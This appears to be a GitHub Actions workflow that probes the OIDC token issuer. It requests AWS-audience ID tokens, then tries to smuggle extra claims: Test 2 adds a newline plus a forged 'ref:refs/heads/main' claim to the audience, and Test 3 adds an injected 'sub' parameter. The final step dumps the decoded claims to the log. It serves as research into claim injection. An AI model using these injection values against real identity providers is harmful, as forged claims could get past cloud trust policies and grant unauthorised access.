name: OIDC Push Audience Test
on:
  push:
    branches:
      - main
    paths:
      - trigger.txt
permissions:
  contents: read
  id-token: write
jobs:
  audience-test:
    runs-on: ubuntu-latest
    steps:
      - name: Test 1 - Standard audience
        run: |
          T=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)
          P=$(echo "$T" | cut -d. -f2)
          echo "=== Test 1 Standard ==="
          echo "$P" | python3 -c "
import sys,base64,json; d=sys.stdin.read().strip()
p=d+'='*(4-len(d)%4)
c=json.loads(base64.urlsafe_b64decode(p))
print('aud:', repr(c.get('aud')))
print('sub:', c.get('sub'))
print('event:', c.get('event_name'))
print('ref:', c.get('ref'))
print('actor:', c.get('actor'))"

      - name: Test 2 - Newline injection
        run: |
          T=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com%0aref%3Arefs%2Fheads%2Fmain" | jq -r .value) 2>/dev/null || echo "failed"
          P=$(echo "$T" | cut -d. -f2)
          echo "=== Test 2 Newline injection ==="
          echo "$P" | python3 -c "
import sys,base64,json; d=sys.stdin.read().strip()
p=d+'='*(4-len(d)%4)
try:
  c=json.loads(base64.urlsafe_b64decode(p))
  print('aud:', repr(c.get('aud')))
except Exception as e:
  print('Error:', e)" 2>/dev/null || echo "REJECTED"

      - name: Test 3 - Sub param injection
        run: |
          T=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com&sub=INJECTED" | jq -r .value) 2>/dev/null || echo "failed"
          P=$(echo "$T" | cut -d. -f2)
          echo "=== Test 3 Sub injection ==="
          echo "$P" | python3 -c "
import sys,base64,json; d=sys.stdin.read().strip()
p=d+'='*(4-len(d)%4)
try:
  c=json.loads(base64.urlsafe_b64decode(p))
  print('sub:', repr(c.get('sub')))
except Exception as e:
  print('Error:', e)" 2>/dev/null || echo "REJECTED"

      - name: Full token dump
        run: |
          T=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)
          echo "$T" | cut -d. -f2 | python3 -c "
import sys,base64,json; d=sys.stdin.read().strip()
p=d+'='*(4-len(d)%4)
print(json.dumps(json.loads(base64.urlsafe_b64decode(p)),indent=2))"
